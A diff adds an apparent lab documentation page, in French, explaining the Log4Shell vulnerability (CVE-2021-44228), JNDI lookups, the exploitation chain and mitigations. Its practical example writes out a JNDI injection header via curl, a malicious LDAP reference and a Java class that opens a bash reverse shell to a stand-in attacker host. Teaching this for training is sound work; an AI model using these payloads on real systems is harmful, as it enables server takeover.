@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learn - Log4Shell CTF Lab</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap');
+        
+        :root {
+            --bg-primary: #0a0e27;
+            --bg-secondary: #151932;
+            --bg-card: #1a1f3a;
+            --accent-primary: #00ff88;
+            --accent-secondary: #00d4ff;
+            --accent-danger: #ff3366;
+            --text-primary: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --border-color: #2d3250;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: var(--bg-secondary);
+            border-bottom: 2px solid var(--border-color);
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .logo h1 {
+            font-size: 1.8em;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .nav-link {
+            padding: 10px 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        
+        .nav-link:hover {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 30px;
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 60px 0;
+            background: linear-gradient(135deg, var(--bg-card) 0%, var(--bg-secondary) 100%);
+            border-radius: 20px;
+            margin-bottom: 40px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .hero h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            font-size: 1.2em;
+            color: var(--text-secondary);
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .section {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 40px;
+            margin-bottom: 30px;
+        }
+        
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--border-color);
+        }
+        
+        .section-icon {
+            font-size: 2.5em;
+            color: var(--accent-primary);
+        }
+        
+        .section-title {
+            font-size: 2em;
+            font-weight: 700;
+        }
+        
+        .content {
+            line-height: 1.8;
+            font-size: 1.1em;
+        }
+        
+        .content h3 {
+            color: var(--accent-secondary);
+            margin: 25px 0 15px 0;
+            font-size: 1.5em;
+        }
+        
+        .content p {
+            margin-bottom: 15px;
+            color: var(--text-secondary);
+        }
+        
+        .content ul {
+            margin-left: 30px;
+            margin-bottom: 20px;
+        }
+        
+        .content li {
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+        
+        .code-block {
+            background: #000;
+            border: 1px solid var(--accent-primary);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: 'Fira Code', monospace;
+            overflow-x: auto;
+        }
+        
+        .code-block code {
+            color: var(--accent-primary);
+        }
+        
+        .warning-box {
+            background: rgba(255, 51, 102, 0.1);
+            border-left: 4px solid var(--accent-danger);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .warning-box strong {
+            color: var(--accent-danger);
+        }
+        
+        .info-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid var(--accent-secondary);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .info-box strong {
+            color: var(--accent-secondary);
+        }
+        
+        .attack-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 30px 0;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .flow-step {
+            flex: 1;
+            min-width: 200px;
+            background: var(--bg-secondary);
+            border: 2px solid var(--accent-primary);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .flow-step::after {
+            content: '→';
+            position: absolute;
+            right: -30px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 2em;
+            color: var(--accent-primary);
+        }
+        
+        .flow-step:last-child::after {
+            display: none;
+        }
+        
+        .flow-number {
+            background: var(--accent-primary);
+            color: var(--bg-primary);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-weight: 700;
+            font-size: 1.2em;
+        }
+        
+        .cve-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--accent-danger), #cc0044);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-family: 'Fira Code', monospace;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <h1><i class="fas fa-book"></i> Documentation Log4Shell</h1>
+        </div>
+        <a href="/dashboard" class="nav-link">
+            <i class="fas fa-arrow-left"></i> Retour au Lab
+        </a>
+    </header>
+    
+    <div class="container">
+        <div class="hero">
+            <h1>🔥 Comprendre Log4Shell</h1>
+            <p>Guide complet sur la vulnérabilité CVE-2021-44228 - L'une des failles les plus critiques de l'histoire de la cybersécurité</p>
+            <div class="cve-badge">CVE-2021-44228 | CVSS 10.0</div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">📖</div>
+                <h2 class="section-title">Qu'est-ce que Log4Shell?</h2>
+            </div>
+            <div class="content">
+                <p>
+                    <strong>Log4Shell</strong> est une vulnérabilité critique de type <strong>Remote Code Execution (RCE)</strong> 
+                    découverte en décembre 2021 dans la bibliothèque de logging Java <strong>Apache Log4j 2</strong>.
+                </p>
+                
+                <h3>🎯 Pourquoi est-elle si dangereuse?</h3>
+                <ul>
+                    <li><strong>Score CVSS: 10.0/10</strong> - Criticité maximale</li>
+                    <li><strong>Exploitation triviale</strong> - Peut être exploitée avec une simple requête HTTP</li>
+                    <li><strong>Impact massif</strong> - Des millions d'applications Java affectées</li>
+                    <li><strong>Pas d'authentification requise</strong> - Exploitable à distance sans credentials</li>
+                    <li><strong>Exécution de code arbitraire</strong> - Contrôle total du serveur</li>
+                </ul>
+                
+                <div class="warning-box">
+                    <strong><i class="fas fa-exclamation-triangle"></i> Attention:</strong>
+                    Cette vulnérabilité a affecté des entreprises majeures comme Apple, Amazon, Tesla, Twitter, 
+                    et des millions de serveurs à travers le monde.
+                </div>
+                
+                <h3>📅 Chronologie</h3>
+                <ul>
+                    <li><strong>9 décembre 2021:</strong> Découverte publique de la vulnérabilité</li>
+                    <li><strong>10 décembre 2021:</strong> Publication du CVE-2021-44228</li>
+                    <li><strong>Décembre 2021:</strong> Exploitation massive dans le monde entier</li>
+                    <li><strong>Aujourd'hui:</strong> Toujours activement exploitée</li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">⚙️</div>
+                <h2 class="section-title">Comment fonctionne JNDI?</h2>
+            </div>
+            <div class="content">
+                <p>
+                    <strong>JNDI (Java Naming and Directory Interface)</strong> est une API Java qui permet aux applications 
+                    de découvrir et d'accéder à des ressources via des noms.
+                </p>
+                
+                <h3>🔍 Fonctionnement Normal de JNDI</h3>
+                <p>JNDI permet de:</p>
+                <ul>
+                    <li>Rechercher des objets Java distants</li>
+                    <li>Se connecter à des bases de données (JDBC)</li>
+                    <li>Accéder à des services LDAP, DNS, RMI</li>
+                    <li>Charger des classes Java dynamiquement</li>
+                </ul>
+                
+                <div class="code-block">
+                    <code>
+// Exemple d'utilisation légitime de JNDI<br>
+Context ctx = new InitialContext();<br>
+DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/myDB");<br>
+                    </code>
+                </div>
+                
+                <h3>⚠️ Le Problème avec Log4j</h3>
+                <p>
+                    Log4j 2 permet l'utilisation de <strong>lookups JNDI</strong> dans les messages de log via la syntaxe:
+                </p>
+                
+                <div class="code-block">
+                    <code>
+${jndi:ldap://attacker.com:1389/Exploit}
+                    </code>
+                </div>
+                
+                <p>
+                    Lorsque Log4j traite ce message, il:
+                </p>
+                <ol>
+                    <li>Détecte la syntaxe <code>${jndi:...}</code></li>
+                    <li>Effectue une requête JNDI vers le serveur spécifié</li>
+                    <li>Télécharge et <strong>exécute</strong> le code Java malveillant</li>
+                </ol>
+                
+                <div class="info-box">
+                    <strong><i class="fas fa-info-circle"></i> Info:</strong>
+                    C'est cette fonctionnalité de "lookup" automatique qui transforme une simple bibliothèque 
+                    de logging en vecteur d'attaque RCE.
+                </div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">🎯</div>
+                <h2 class="section-title">Anatomie de l'Exploitation</h2>
+            </div>
+            <div class="content">
+                <h3>🔗 Chaîne d'Attaque Complète</h3>
+                
+                <div class="attack-flow">
+                    <div class="flow-step">
+                        <div class="flow-number">1</div>
+                        <strong>Injection</strong>
+                        <p>L'attaquant envoie un payload malveillant</p>
+                    </div>
+                    <div class="flow-step">
+                        <div class="flow-number">2</div>
+                        <strong>Logging</strong>
+                        <p>Log4j traite le message</p>
+                    </div>
+                    <div class="flow-step">
+                        <div class="flow-number">3</div>
+                        <strong>JNDI Lookup</strong>
+                        <p>Connexion au serveur LDAP</p>
+                    </div>
+                    <div class="flow-step">
+                        <div class="flow-number">4</div>
+                        <strong>Download</strong>
+                        <p>Téléchargement du code malveillant</p>
+                    </div>
+                    <div class="flow-step">
+                        <div class="flow-number">5</div>
+                        <strong>RCE</strong>
+                        <p>Exécution du code</p>
+                    </div>
+                </div>
+                
+                <h3>💻 Exemple Pratique</h3>
+                
+                <p><strong>Étape 1: Injection du Payload</strong></p>
+                <div class="code-block">
+                    <code>
+curl http://vulnerable-app:8080 \<br>
+  -H 'X-Api-Version: ${jndi:ldap://attacker.com:1389/Exploit}'
+                    </code>
+                </div>
+                
+                <p><strong>Étape 2: Serveur LDAP Malveillant</strong></p>
+                <div class="code-block">
+                    <code>
+# Le serveur LDAP répond avec une référence vers une classe Java<br>
+javaCodeBase: http://attacker.com:8888/<br>
+javaClassName: Exploit
+                    </code>
+                </div>
+                
+                <p><strong>Étape 3: Payload Java (Exploit.class)</strong></p>
+                <div class="code-block">
+                    <code>
+public class Exploit {<br>
+    static {<br>
+        try {<br>
+            // Reverse shell<br>
+            Runtime.getRuntime().exec(<br>
+                "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"<br>
+            );<br>
+        } catch (Exception e) {}<br>
+    }<br>
+}
+                    </code>
+                </div>
+                
+                <h3>🛡️ Vecteurs d'Injection</h3>
+                <p>Le payload peut être injecté via:</p>
+                <ul>
+                    <li><strong>Headers HTTP:</strong> User-Agent, X-Forwarded-For, Cookie, etc.</li>
+                    <li><strong>Paramètres GET/POST:</strong> Formulaires, API endpoints</li>
+                    <li><strong>Champs de formulaire:</strong> Username, email, etc.</li>
+                    <li><strong>Messages d'erreur:</strong> Tout ce qui est loggé</li>
+                </ul>
+                
+                <div class="warning-box">
+                    <strong><i class="fas fa-shield-alt"></i> Défense:</strong>
+                    <ul>
+                        <li>Mettre à jour Log4j vers la version 2.17.1 ou supérieure</li>
+                        <li>Désactiver les lookups JNDI: <code>-Dlog4j2.formatMsgNoLookups=true</code></li>
+                        <li>Utiliser un WAF pour bloquer les patterns <code>${jndi:</code></li>
+                        <li>Segmenter le réseau pour limiter les connexions sortantes</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">📚</div>
+                <h2 class="section-title">Ressources Complémentaires</h2>
+            </div>
+            <div class="content">
+                <h3>🔗 Liens Utiles</h3>
+                <ul>
+                    <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" style="color: var(--accent-primary);">CVE-2021-44228 - NVD</a></li>
+                    <li><a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" style="color: var(--accent-primary);">Apache Log4j Security</a></li>
+                    <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" target="_blank" style="color: var(--accent-primary);">LunaSec - Log4Shell Analysis</a></li>
+                </ul>
+                
+                <h3>🎓 Pour Aller Plus Loin</h3>
+                <ul>
+                    <li>Étudier les variantes: CVE-2021-45046, CVE-2021-45105</li>
+                    <li>Comprendre les techniques de bypass des protections</li>
+                    <li>Analyser les IOCs (Indicators of Compromise)</li>
+                    <li>Pratiquer la détection avec des outils SIEM</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
